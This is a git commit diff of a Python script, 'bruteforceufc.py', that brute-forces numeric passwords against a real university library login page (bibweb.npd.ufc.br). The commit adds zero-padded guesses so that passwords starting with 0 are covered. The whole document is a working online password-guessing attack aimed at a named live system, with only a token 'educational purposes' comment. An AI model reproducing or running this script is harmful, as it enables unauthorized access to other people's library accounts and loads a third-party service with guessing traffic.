a48b4265170510b98a2bcf4b0608b21ed1493166
Davi Wesley <davi.wesley@icloud.com>
2016-04-01 09:01:55 -0400

    update algorithm
    Finally I found a way to get work my code with passwords that start with 0 in the beginning, it still needs some improvements in the code

--- bruteforceufc.py
+++ bruteforceufc.py
@@ -5,18 +5,63 @@ __email__ = "davi.wesley@icloud.com"
 '''
 Esse programa foi feito para fins educativos
 '''
-def main():
-  inscricao = int(input("Digite sua incrição: "))
-  inicio = int(input("Digite o inicio do intervalo: "))
-  fim = int(input("Digite o final do intervalo: "))
-  for i in range(inicio, fim):
-      url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(i) + "&button=Acessar&numero_mestre="
-      webUrl=urllib2.urlopen(url)
-      data=webUrl.read()
-      if data == "Acesso não autorizado!":
-          print "SENHA ENCONTRADA= " + str(i)
-          break
-      else:
-          print "SENHA NAO ENCONTRADA" + str(i)
-if __name__ == "__main__":
-  main()
+inscricao = int(input("Digite sua incrição: "))
+a = int(input("Digite o inicio do intervalo: "))
+b = int(input("Digite o final do intervalo: "))
+
+for i in range(a, b + 1):
+    # sequencia para '0000##'
+    if (a < 9) and (b >= 9):
+        z = '00000' + str(i)
+        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao) + "&password=" + str(z) + "&button=Acessar&numero_mestre="
+        webUrl = urllib2.urlopen(url)
+        data = webUrl.read()
+        if data == "Acesso não autorizado!":
+            print "[!]SENHA ENCONTRADA= " + str(z)
+            break
+        else:
+            print "[+]SENHA NAO ENCONTRADA " + str(z)
+    # sequencia para '000###'
+    if (a < 1000) and (b >= 100):
+        z = '000' + str(i)
+        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
+        webUrl=urllib2.urlopen(url)
+        data=webUrl.read()
+        if data == "Acesso não autorizado!":
+            print "[!]SENHA ENCONTRADA= " + str(z)
+            break
+        else:
+            print "[+]SENHA NAO ENCONTRADA " + str(z)
+    # sequencia para '00####'
+    if (a < 10000) and (b >= 1000):
+        z = '00' + str(i)
+        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
+        webUrl=urllib2.urlopen(url)
+        data=webUrl.read()
+        if data == "Acesso não autorizado!":
+            print "[!]SENHA ENCONTRADA= " + str(z)
+            break
+        else:
+            print "[+]SENHA NAO ENCONTRADA " + str(z)
+    # sequencia para '0#####'
+    if (a < 100000) and (b >= 10000):
+        z = '0' + str(i)
+        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
+        webUrl=urllib2.urlopen(url)
+        data=webUrl.read()
+        if data == "Acesso não autorizado!":
+            print "[!]SENHA ENCONTRADA= " + str(z)
+            break
+        else:
+            print "[+]SENHA NAO ENCONTRADA " + str(z)
+    # sequencia para '######' 6 digitos(full)
+    if (a < 1000000) and (b >= 100000):
+        z = str(i)
+        url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(z) + "&button=Acessar&numero_mestre="
+        webUrl=urllib2.urlopen(url)
+        data=webUrl.read()
+        if data == "Acesso não autorizado!":
+            print "[!]SENHA ENCONTRADA= " + str(z)
+            break
+        else:
+            print "[+]SENHA NAO ENCONTRADA " + str(z)
